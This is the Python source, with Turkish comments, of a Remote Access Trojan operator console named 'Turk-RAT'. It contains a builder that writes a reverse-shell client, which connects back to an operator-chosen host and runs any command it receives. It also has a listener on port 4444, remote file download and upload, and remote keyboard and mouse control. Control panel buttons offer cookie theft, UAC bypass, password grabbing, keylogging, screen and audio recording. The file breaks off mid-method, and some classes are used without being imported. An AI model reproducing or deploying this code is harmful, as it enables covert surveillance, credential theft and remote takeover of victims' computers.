import sys
import os
import socket
import time
import threading
import json
import zipfile
import smtplib
import logging
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from PySide6.QtWidgets import QApplication, QMainWindow, QTabWidget, QWidget, QPushButton, QVBoxLayout, QLabel, \
    QTextEdit, QInputDialog, QFileDialog, QHBoxLayout, QMessageBox, QLineEdit, QFrame, QDialog, QListWidget, \
    QListWidgetItem, QCheckBox, QColorDialog, QComboBox, QSpinBox, QScrollArea
from PySide6.QtGui import QPixmap, QIcon, QColor, QPalette
from PySide6.QtCore import Qt, QThread, Signal, QTimer, QRunnable, QObject
import cv2
import numpy as np
import pickle
import struct

# Loglama ayarları
logging.basicConfig(filename='rat.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Sabitler
DOWNLOAD_DIR = "server_downloads"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
BUFFER_SIZE = 4096 * 4
FILE_TRANSFER_KEYWORD = "FILE_TRANSFER:"
PING_KEYWORD = "PING:"
UPLOAD_KEYWORD = "UPLOAD:"
DEFAULT_PORT = 4444
IMAGE_DIR = r"C:\Users\Kiokhan\PyCharmMiscProject\Turk-RAT\ogren_kanka"
OS_IMAGE_DIR = r"C:\Users\Kiokhan\PyCharmMiscProject\Turk-RAT\ogren_kanka\Os"
FLAG_IMAGE_DIR = r"C:\Users\Kiokhan\PyCharmMiscProject\Turk-RAT\ogren_kanka\flags"
CONTROL_PORT = 10000

# Ekran izleme için sabitler
SERVER_IP = '127.0.0.1'
VIDEO_PORT = 9999
video_socket = None
control_socket = None
frame_width = 0
frame_height = 0

# VK KODU EŞLEŞTİRMESİ
VK_MAP = {
    '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34, '5': 0x35,
    '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39, '0': 0x30,
    'Q': 0x51, 'W': 0x57, 'E': 0x45, 'R': 0x52, 'T': 0x54,
    'Y': 0x59, 'U': 0x55, 'I': 0x49, 'O': 0x4F, 'P': 0x50,
    'A': 0x41, 'S': 0x53, 'D': 0x44, 'F': 0x46, 'G': 0x47,
    'H': 0x48, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C,
    'Z': 0x5A, 'X': 0x58, 'C': 0x43, 'V': 0x56, 'B': 0x42,
    'N': 0x4E, 'M': 0x4D,
    'SPACE': 0x20, 'ENTER': 0x0D, 'BACKSPACE': 0x08,
    'TAB': 0x09, 'SHIFT': 0xA0, 'CTRL': 0xA2, 'ALT': 0xA4,
    'ESC': 0x1B,
}


# BuilderWindow sınıfı
class BuilderWindow(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setStyleSheet("background-color: #000000;")
        layout = QVBoxLayout(self)
        layout.setAlignment(Qt.AlignCenter)

        title_label = QLabel("RAT İstemci Oluşturucu")
        title_label.setStyleSheet("color: #f70202; font-size: 24px; font-weight: bold;")
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)

        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Sunucu IP'si (örn: 192.168.1.100)")
        self.ip_input.setStyleSheet("""
            QLineEdit { color: #f70202; background-color: #000000; border: 2px solid #f70202; padding: 10px; font-size: 16px; }
        """)
        self.ip_input.setFixedSize(300, 40)
        layout.addWidget(self.ip_input)

        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Sunucu Portu (örn: 4443)")
        self.port_input.setStyleSheet("""
            QLineEdit { color: #f70202; background-color: #000000; border: 2px solid #f70202; padding: 10px; font-size: 16px; }
        """)
        self.port_input.setFixedSize(300, 40)
        layout.addWidget(self.port_input)

        build_button = QPushButton("İstemciyi Oluştur")
        build_button.clicked.connect(self.build_client)
        build_button.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        build_button.setFixedSize(300, 40)
        layout.addWidget(build_button)

        self.status_label = QLabel("")
        self.status_label.setStyleSheet("color: #f70202; font-size: 14px;")
        layout.addWidget(self.status_label)

        layout.addStretch()
        logging.info("BuilderWindow başlatıldı.")

    def build_client(self):
        ip = self.ip_input.text().strip()
        port = self.port_input.text().strip()

        if not ip or not port:
            self.status_label.setText("Hata: IP ve port alanları boş olamaz!")
            logging.warning("BuilderWindow: IP veya port boş.")
            return

        try:
            port = int(port)
            if not (0 <= port <= 65535):
                raise ValueError("Port 0-65535 arasında olmalı.")
        except ValueError:
            self.status_label.setText("Hata: Geçerli bir port numarası girin!")
            logging.warning("BuilderWindow: Geçersiz port numarası.")
            return

        client_code = f"""
import sys
import socket
import threading
import subprocess
import os
import time
from PySide6.QtWidgets import QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QLabel
from PySide6.QtCore import Qt

class ClientGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RAT İstemci")
        self.setGeometry(100, 100, 400, 200)
        self.setStyleSheet("background-color: #000000;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        label = QLabel("RAT İstemci Çalışıyor")
        label.setStyleSheet("color: #f70202; font-size: 16px;")
        label.setAlignment(Qt.AlignCenter)
        layout.addWidget(label)

        close_button = QPushButton("Pencereyi Kapat")
        close_button.clicked.connect(self.close)
        close_button.setStyleSheet("color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000;")
        layout.addWidget(close_button)

def run_client():
    SERVER_IP = "{ip}"
    SERVER_PORT = {port}
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            sock.connect((SERVER_IP, SERVER_PORT))
            break
        except:
            time.sleep(5)

    while True:
        try:
            command = sock.recv(1024).decode('utf-8')
            if command == "PING:":
                sock.send("PONG".encode('utf-8'))
            elif command:
                result = subprocess.getoutput(command)
                sock.send(result.encode('utf-8'))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while True:
                try:
                    sock.connect((SERVER_IP, SERVER_PORT))
                    break
                except:
                    time.sleep(5)

if __name__ == "__main__":
    client_thread = threading.Thread(target=run_client, daemon=True)
    client_thread.start()

    app = QApplication(sys.argv)
    window = ClientGUI()
    window.show()
    sys.exit(app.exec())
"""

        try:
            save_path = QFileDialog.getSaveFileName(self, "İstemciyi Kaydet", "client.py", "Python Files (*.py)")[0]
            if save_path:
                with open(save_path, 'w') as f:
                    f.write(client_code)
                self.status_label.setText(f"İstemci oluşturuldu: {save_path}")
                logging.info(f"İstemci oluşturuldu: {save_path}")
            else:
                self.status_label.setText("Hata: Dosya kaydedilmedi!")
                logging.warning("BuilderWindow: Dosya kaydetme iptal edildi.")
        except Exception as e:
            self.status_label.setText(f"Hata: {e}")
            logging.error(f"BuilderWindow: İstemci oluşturma hatası: {e}")


# SocketClient ve Worker Sınıfları
class SocketClient(QObject):
    connection_status = Signal(bool, str)

    def __init__(self, ip, port):
        super().__init__()
        self.ip = ip
        self.port = port
        self.sock = None

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.ip, self.port))
            self.connection_status.emit(True, "Bağlantı Başarılı.")
        except ConnectionRefusedError:
            self.connection_status.emit(False, "HATA: Sunucu kapalı veya IP yanlış.")
        except socket.timeout:
            self.connection_status.emit(False, "HATA: Bağlantı Zaman Aşımına Uğradı.")
        except Exception as e:
            self.connection_status.emit(False, f"Bilinmeyen Hata: {e}")

    def send_command(self, vk_code, action):
        if not self.sock:
            return False
        command = {'type': 'key', 'vk': vk_code, 'action': action}
        try:
            data = pickle.dumps(command)
            self.sock.sendall(data)
            return True
        except Exception:
            self.connection_status.emit(False, "HATA: Bağlantı koptu!")
            if self.sock:
                self.sock.close()
                self.sock = None
            return False

    def close(self):
        if self.sock:
            self.send_command(0, 'exit')
            self.sock.close()
            self.sock = None


class Worker(QRunnable):
    def __init__(self, fn, *args, **kwargs):
        super().__init__()
        self.fn = fn
        self.args = args
        self.kwargs = kwargs

    def run(self):
        self.fn(*self.args, **self.kwargs)


# Sanal Klavye GUI
class VirtualKeyboardApp(QMainWindow):
    def __init__(self, ip, port):
        super().__init__()
        self.setWindowTitle("Uzaktan Sanal Klavye")
        self.setGeometry(100, 100, 800, 400)
        self.threadpool = QThreadPool()
        self.client = SocketClient(ip, port)
        self.client.connection_status.connect(self.update_status)
        self.setup_ui()
        self.connect_server()

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        self.layout = QGridLayout(central_widget)

        keyboard_layout = [
            ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'BACKSPACE', 'ESC'],
            ['Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'ENTER'],
            ['A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'SHIFT'],
            ['Z', 'X', 'C', 'V', 'B', 'N', 'M', 'CTRL', 'ALT', 'SPACE'],
        ]

        palette = self.palette()
        palette.setColor(QPalette.Window, QColor("#000000"))
        self.setPalette(palette)

        row_map = {'SPACE': 3, 'ENTER': 1, 'BACKSPACE': 0, 'SHIFT': 2, 'CTRL': 3, 'ALT': 3, 'ESC': 0}
        col_map = {'SPACE': 9, 'ENTER': 10, 'BACKSPACE': 10, 'SHIFT': 9, 'CTRL': 7, 'ALT': 8, 'ESC': 11}
        width_map = {'SPACE': 3, 'ENTER': 1, 'BACKSPACE': 1, 'SHIFT': 1, 'CTRL': 1, 'ALT': 1, 'ESC': 1}

        for r, row in enumerate(keyboard_layout):
            c = 0
            for key_text in row:
                btn = QPushButton(key_text)
                btn.setStyleSheet("""
                    QPushButton {
                        background-color: #CC0000;
                        color: white;
                        font-size: 16px;
                        padding: 10px;
                        border: 1px solid #990000;
                    }
                    QPushButton:pressed {
                        background-color: #FF3333;
                    }
                """)
                span = width_map.get(key_text, 1)
                if key_text in row_map:
                    self.layout.addWidget(btn, row_map[key_text], col_map[key_text], 1, span)
                else:
                    self.layout.addWidget(btn, r, c, 1, span)
                    c += span
                btn.clicked.connect(lambda _, k=key_text: self.send_key(k))

        self.statusBar().showMessage("Bağlantı bekleniyor...")

    def connect_server(self):
        self.statusBar().showMessage(f"Sunucuya bağlanılıyor: {self.client.ip}:{self.client.port}")
        worker = Worker(self.client.connect)
        self.threadpool.start(worker)

    def update_status(self, is_connected, message):
        if is_connected:
            self.statusBar().setStyleSheet("background-color: #00AA00; color: white;")
        else:
            self.statusBar().setStyleSheet("background-color: #AA0000; color: white;")
            QMessageBox.critical(self, "Bağlantı Hatası", message)
            time.sleep(2)
            self.connect_server()
        self.statusBar().showMessage(message)

    def send_key(self, key_text):
        vk_code = VK_MAP.get(key_text.upper())
        if vk_code is None:
            return
        self.client.send_command(vk_code, 'down')
        time.sleep(0.01)
        self.client.send_command(vk_code, 'up')

    def closeEvent(self, event):
        self.client.close()
        self.threadpool.waitForDone()
        event.accept()


# Ekran alma fonksiyonu
def start_video_receiver():
    global video_socket, frame_width, frame_height
    video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        video_socket.connect((SERVER_IP, VIDEO_PORT))
        logging.info(f"Video bağlantısı kuruldu: {SERVER_IP}:{VIDEO_PORT}")
    except ConnectionRefusedError:
        logging.error(f"Sunucu ({SERVER_IP}:{VIDEO_PORT}) bağlantıyı reddetti.")
        return

    data = b""
    payload_size = struct.calcsize("L")

    cv2.namedWindow("UZAK EKRAN", cv2.WINDOW_NORMAL)
    cv2.setMouseCallback("UZAK EKRAN", send_control_commands)

    while True:
        try:
            while len(data) < payload_size:
                data += video_socket.recv(4096)

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += video_socket.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            frame = np.frombuffer(frame_data, dtype=np.uint8)
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

            if frame is not None:
                frame_height, frame_width, _ = frame.shape
                cv2.imshow("UZAK EKRAN", frame)

            key = cv2.waitKey(1) & 0xFF

            if key == 13:
                command = {'type': 'keypress', 'key': 'enter'}
                send_command(command)

            if key == ord('q'):
                send_command({'type': 'keypress', 'key': 'q'})
                break

        except Exception as e:
            logging.error(f"[Video İstemci] Hata: {e}")
            break

    cv2.destroyAllWindows()
    video_socket.close()


def send_command(command):
    global control_socket
    if control_socket is None:
        logging.error("[Kontrol] Kontrol bağlantısı kurulamadı.")
        return
    try:
        data = pickle.dumps(command)
        control_socket.sendall(data)
        logging.info(f"Kontrol komutu gönderildi: {command}")
        return True
    except Exception as e:
        logging.error(f"[Kontrol Hata] Gönderilemedi: {e}")
        return False


def send_control_commands(event, x, y, flags, param):
    if event == cv2.EVENT_LBUTTONDOWN:
        command = {'type': 'click', 'x': x, 'y': y}
        if send_command(command):
            logging.info(f"[Kontrol] Gönderildi: Tıklama ({x},{y})")


class ServerThread(QThread):
    client_connected = Signal(str, dict)
    initial_message = Signal(str)
    authority_message = Signal(str, str)
    client_disconnected = Signal(str)

    def __init__(self):
        super().__init__()
        self.server_socket = None
        self.clients = {}
        self.ping_timer = QTimer()
        self.ping_timer.timeout.connect(self.send_ping)
        self.ping_timer.start(15000)

    def send_ping(self):
        for addr, conn in list(self.clients.items()):
            try:
                conn.send(PING_KEYWORD.encode("utf-8"))
                logging.debug(f"Ping gönderildi: {addr[0]}:{addr[1]}")
            except Exception as e:
                logging.error(f"Ping gönderirken hata ({addr[0]}:{addr[1]}): {e}")
                self.clients.pop(addr, None)
                conn.close()
                self.client_disconnected.emit(f"{addr[0]}:{addr[1]}")

    def run(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', DEFAULT_PORT))
            self.server_socket.listen(5)
            logging.info(f"Sunucu dinlemede: 0.0.0.0:{DEFAULT_PORT}")
            while True:
                conn, addr = self.server_socket.accept()
                conn.setblocking(False)
                addr_str = f"{addr[0]}:{addr[1]}"
                self.clients[addr] = conn
                logging.info(f"Yeni istemci bağlandı: {addr_str}")
                threading.Thread(target=self.handle_client_initial, args=(conn, addr), daemon=True).start()
        except Exception as e:
            logging.error(f"Server hatası: {e}")

    def handle_client_initial(self, conn, addr):
        try:
            conn.settimeout(10.0)
            initial_response = conn.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
            self.initial_message.emit(initial_response.strip())
            logging.debug(f"İlk yanıt alındı: {initial_response.strip()}")
            system_info = conn.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
            try:
                system_info_dict = json.loads(system_info)
            except json.JSONDecodeError:
                system_info_dict = {"os": "Bilinmiyor", "ip": addr[0], "country": "Bilinmiyor", "cpu": "Bilinmiyor",
                                    "ram": "Bilinmiyor", "disk": "Bilinmiyor"}
                logging.warning(f"Sistem bilgisi JSON hatası, varsayılan değerler kullanıldı: {addr[0]}:{addr[1]}")
            addr_str = f"{addr[0]}:{addr[1]}"
            self.client_connected.emit(addr_str, system_info_dict)
            authority_response = conn.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
            self.authority_message.emit(addr_str, authority_response.strip())
            logging.debug(f"Yetki alındı: {addr_str} - {authority_response.strip()}")
        except socket.timeout:
            logging.error(f"İstemci ({addr[0]}:{addr[1]}) zaman aşımı")
        except Exception as e:
            logging.error(f"İstemci ({addr[0]}:{addr[1]}) hatası: {e}")
        finally:
            conn.settimeout(None)


class FileManagerWindow(QMainWindow):
    def __init__(self, conn, parent=None):
        super().__init__(parent)
        self.conn = conn
        self.setWindowTitle("Dosya İşlemleri")
        self.setGeometry(200, 200, 600, 400)
        self.setStyleSheet("background-color: #000000;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        self.log_text = QTextEdit()
        self.log_text.setStyleSheet("color: #f70202; background-color: #1a1a1a; border: 1px solid #f70202;")
        self.log_text.setReadOnly(True)
        layout.addWidget(self.log_text)

        self.file_list = QListWidget()
        self.file_list.setStyleSheet("color: #f70202; background-color: #1a1a1a; border: 1px solid #f70202;")
        self.file_list.itemDoubleClicked.connect(self.handle_double_click)
        layout.addWidget(self.file_list)

        buttons_layout = QHBoxLayout()
        buttons = [
            ("Dosya İndir", self.download_file),
            ("LS", self.ls),
            ("PWD", self.pwd),
            ("CD", self.cd),
            ("CD ..", self.cd_back),
            ("MKDIR", self.mkdir),
            ("Download (Dizin)", self.download_dir),
            ("Dosya Yükle", self.upload_file)
        ]
        for text, func in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(func)
            btn.setStyleSheet("""
                QPushButton { color: #f70202; border: 2px solid #f70202; padding: 5px; font-size: 14px; background-color: #000000; }
                QPushButton:hover { background-color: #1a1a1a; }
            """)
            buttons_layout.addWidget(btn)

        layout.addLayout(buttons_layout)

        self.receive_buffer = b""
        self.expected_file_size = 0
        self.received_file_size = 0
        self.file_save_path = None
        self.is_file_transfer = False

        self.receive_timer = QTimer(self)
        self.receive_timer.timeout.connect(self.check_response)
        self.receive_timer.start(50)

        self.send_command("pwd")
        time.sleep(0.5)
        self.send_command("dir")
        logging.info("Dosya Yöneticisi başlatıldı, pwd ve dir komutları gönderildi.")

    def send_command(self, command):
        if not self.conn:
            self.log_text.append("Bağlantı kesildi!")
            logging.error("Dosya Yöneticisi: Bağlantı kesildi!")
            return
        try:
            self.conn.send(command.encode("utf-8"))
            self.log_text.append(f"Komut gönderildi: {command}")
            logging.info(f"Dosya Yöneticisi: Komut gönderildi: {command}")
        except Exception as e:
            self.log_text.append(f"Hata: {e}")
            logging.error(f"Dosya Yöneticisi: Komut gönderirken hata: {e}")

    def check_response(self):
        if not self.conn:
            self.log_text.append("Bağlantı kesildi!")
            self.receive_timer.stop()
            logging.error("Dosya Yöneticisi: Bağlantı kesildi, timer durduruldu.")
            return
        try:
            data = self.conn.recv(BUFFER_SIZE)
            if data:
                if self.is_file_transfer:
                    self.handle_file_data(data)
                else:
                    self.receive_buffer += data
                    if b'\n' in self.receive_buffer:
                        lines = self.receive_buffer.split(b'\n')
                        for line in lines[:-1]:
                            self.process_response(line.decode('utf-8', errors='ignore'))
                        self.receive_buffer = lines[-1]
        except Exception as e:
            logging.debug(f"Dosya Yöneticisi: Yanıt kontrolünde hata: {e}")

    def process_response(self, response):
        if response.startswith(FILE_TRANSFER_KEYWORD):
            parts = response[len(FILE_TRANSFER_KEYWORD):].split(':')
            if len(parts) == 2:
                file_name, file_size = parts
                self.expected_file_size = int(file_size)
                self.file_save_path = os.path.join(DOWNLOAD_DIR, file_name)
                self.received_file_size = 0
                self.is_file_transfer = True
                self.log_text.append(f"Dosya alımı başlıyor: {file_name} ({file_size} bayt)")
                logging.info(f"Dosya alımı başlıyor: {file_name} ({file_size} bayt)")
        else:
            self.log_text.append(response)
            logging.debug(f"Dosya Yöneticisi: Yanıt alındı: {response}")
            if "ls:" in response or "dir:" in response:
                self.update_file_list(response)

    def handle_file_data(self, data):
        try:
            with open(self.file_save_path, 'ab') as f:
                f.write(data)
            self.received_file_size += len(data)
            if self.received_file_size >= self.expected_file_size:
                self.log_text.append(f"Dosya alındı: {self.file_save_path}")
                logging.info(f"Dosya alındı: {self.file_save_path}")
                self.is_file_transfer = False
                self.expected_file_size = 0
                self.file_save_path = None
        except Exception as e:
            self.log_text.append(f"Dosya yazma hatası: {e}")
            logging.error(f"Dosya yazma hatası: {e}")
            self.is_file_transfer = False

    def update_file_list(self, response):
        self.file_list.clear()
        lines = response.split('\n')[1:]
        for line in lines:
            if line.strip():
                item = QListWidgetItem(line.strip())
                self.file_list.addItem(item)
        logging.debug(f"Dosya listesi güncellendi: {lines}")

    def handle_double_click(self, item):
        selected = item.text()
        if '<DIR>' in selected:
            self.send_command(f"cd {selected.replace('<DIR>', '').strip()}")
        else:
            self.send_command(f"download {selected}")
        logging.info(f"Dosya Yöneticisi: Çift tıklama: {selected}")

    def download_file(self):
        selected = self.file_list.currentItem()
        if selected:
            self.send_command(f"download {selected.text()}")
        else:
            path, ok = QInputDialog.getText(self, "Download", "Dosya yolu girin:")
            if ok:
                self.send_command(f"download {path}")
        logging.info(f"Dosya Yöneticisi: Dosya indirme komutu: {selected.text() if selected else path}")

    def ls(self):
        self.send_command("dir")

    def pwd(self):
        self.send_command("pwd")

    def cd(self):
        selected = self.file_list.currentItem()
        if selected:
            self.send_command(f"cd {selected.text()}")
        else:
            path, ok = QInputDialog.getText(self, "CD", "Dizin yolu girin:")
            if ok:
                self.send_command(f"cd {path}")

    def cd_back(self):
        self.send_command("cd ..")

    def mkdir(self):
        dir_name, ok = QInputDialog.getText(self, "MKDIR", "Dizin adı girin:")
        if ok:
            self.send_command(f"mkdir {dir_name}")

    def download_dir(self):
        selected = self.file_list.currentItem()
        if selected:
            self.send_command(f"download {selected.text()}")
        else:
            path, ok = QInputDialog.getText(self, "Download Dizin", "Dizin yolu girin:")
            if ok:
                self.send_command(f"download {path}")

    def upload_file(self):
        file_path = QFileDialog.getOpenFileName(self, "Dosya Seçin")[0]
        if file_path:
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            header = f"{UPLOAD_KEYWORD}{file_name}:{file_size}\n"
            self.conn.send(header.encode("utf-8"))
            time.sleep(0.5)
            with open(file_path, "rb") as f:
                while True:
                    bytes_read = f.read(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    self.conn.sendall(bytes_read)
            self.log_text.append(f"Dosya yüklendi: {file_name}")
            logging.info(f"Dosya yüklendi: {file_name}")


class TrollWindow(QDialog):
    def __init__(self, conn, parent=None):
        super().__init__(parent)
        self.conn = conn
        self.setWindowTitle("Troll Mesajı")
        self.setGeometry(300, 300, 400, 200)
        self.setStyleSheet("background-color: #000000;")

        layout = QVBoxLayout(self)

        self.message_input = QLineEdit()
        self.message_input.setPlaceholderText("Mesaj yazın...")
        self.message_input.setStyleSheet("""
            QLineEdit { color: #f70202; background-color: #000000; border: 2px solid #f70202; padding: 10px; font-size: 16px; }
        """)
        layout.addWidget(self.message_input)

        send_btn = QPushButton("Gönder")
        send_btn.clicked.connect(self.send_message)
        send_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        layout.addWidget(send_btn)

        logging.info("TrollWindow başlatıldı.")

    def send_message(self):
        message = self.message_input.text()
        if message:
            try:
                self.conn.send(f"messagebox {message}".encode("utf-8"))
                QMessageBox.information(self, "Başarılı", "Mesaj gönderildi!")
                logging.info(f"Troll mesajı gönderildi: {message}")
            except Exception as e:
                QMessageBox.critical(self, "Hata", f"Mesaj gönderilemedi: {e}")
                logging.error(f"Troll mesajı gönderilemedi: {e}")


class ControlPanel(QMainWindow):
    def __init__(self, conn, addr, parent=None):
        super().__init__(parent)
        self.conn = conn
        self.addr = addr
        self.setWindowTitle(f"Kontrol Paneli - {addr[0]}:{addr[1]}")
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("background-color: #000000;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        self.authority_label = QLabel("Yetki: Bilinmiyor")
        self.authority_label.setStyleSheet("color: #f70202; font-size: 16px;")
        layout.addWidget(self.authority_label)

        self.response_text = QTextEdit()
        self.response_text.setStyleSheet("color: #f70202; background-color: #1a1a1a; border: 1px solid #f70202;")
        self.response_text.setReadOnly(True)
        layout.addWidget(self.response_text)

        buttons_layout = QVBoxLayout()

        file_ops_btn = QPushButton("Dosya İşlemleri")
        file_ops_btn.clicked.connect(self.open_file_manager)
        file_ops_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(file_ops_btn)

        block_website_btn = QPushButton("Block Website")
        block_website_btn.clicked.connect(self.send_block_website)
        block_website_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(block_website_btn)

        unblock_website_btn = QPushButton("Unblock Website")
        unblock_website_btn.clicked.connect(self.send_unblock_website)
        unblock_website_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(unblock_website_btn)

        get_cookies_btn = QPushButton("Get Cookies")
        get_cookies_btn.clicked.connect(self.send_get_cookies)
        get_cookies_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(get_cookies_btn)

        uac_bypass_btn = QPushButton("UAC Bypass")
        uac_bypass_btn.clicked.connect(self.send_uac_bypass)
        uac_bypass_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(uac_bypass_btn)

        grab_passwords_btn = QPushButton("Grab Passwords")
        grab_passwords_btn.clicked.connect(self.send_grab_passwords)
        grab_passwords_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(grab_passwords_btn)

        keylog_btn = QPushButton("Keylog (15s)")
        keylog_btn.clicked.connect(self.send_keylog)
        keylog_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(keylog_btn)

        online_keylog_btn = QPushButton("Online Keylogger")
        online_keylog_btn.clicked.connect(self.start_online_keylogger)
        online_keylog_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(online_keylog_btn)

        screen_record_btn = QPushButton("Screen Record (15s)")
        screen_record_btn.clicked.connect(self.send_screen_record)
        screen_record_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(screen_record_btn)

        ss_btn = QPushButton("SS (Screenshot)")
        ss_btn.clicked.connect(self.send_ss)
        ss_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(ss_btn)

        record_audio_btn = QPushButton("Ses Kaydet (30s)")
        record_audio_btn.clicked.connect(self.send_record_audio)
        record_audio_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(record_audio_btn)

        play_video_btn = QPushButton("Video Oynat")
        play_video_btn.clicked.connect(self.send_play_video)
        play_video_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(play_video_btn)

        kapat_btn = QPushButton("Kapat")
        kapat_btn.clicked.connect(self.send_kapat)
        kapat_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(kapat_btn)

        screen_share_btn = QPushButton("Start Screen Share")
        screen_share_btn.clicked.connect(self.start_screen_share)
        screen_share_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(screen_share_btn)

        troll_btn = QPushButton("Troll")
        troll_btn.clicked.connect(self.open_troll_window)
        troll_btn.setStyleSheet("""
            QPushButton { color: #f70202; border: 2px solid #f70202; padding: 10px; font-size: 16px; background-color: #000000; }
            QPushButton:hover { background-color: #1a1a1a; }
        """)
        buttons_layout.addWidget(troll_btn)

        layout.addLayout(buttons_layout)

        self.receive_timer = QTimer(self)
        self.receive_timer.timeout.connect(self.check_response)
        self.receive_buffer = b""
        self.expected_file_size = 0
        self.received_file_size = 0
        self.file_save_path = None
        self.is_file_transfer = False

        logging.info(f"Kontrol Paneli başlatıldı: {addr[0]}:{addr[1]}")
        self.show()
        self.activateWindow()

    def toggle_connection_logging(self, state):
        addr_str = f"{self.addr[0]}:{self.addr[1]}"
        with self.parent().server_thread.clients_lock:
            addr = (self.addr[0], self.addr[1])
            if addr in self.parent().server_thread.clients:
                self.parent().server_thread.clients[addr]['log_connection'] = bool(state)
                logging.info(f"Bağlantı loglama {'açıldı' if state else 'kapatıldı'}: {addr_str}")
            else:
                self.response_text.append("İstemci bağlantısı bulunamadı!")
                self.log_connection_cb.setChecked(False)

    def open_file_manager(self):
        file_manager = FileManagerWindow(self.conn, self)
        file_manager.show()
        file_manager.activateWindow()
        logging.info("Dosya Yöneticisi penceresi açıldı.")

    def open_troll_window(self):
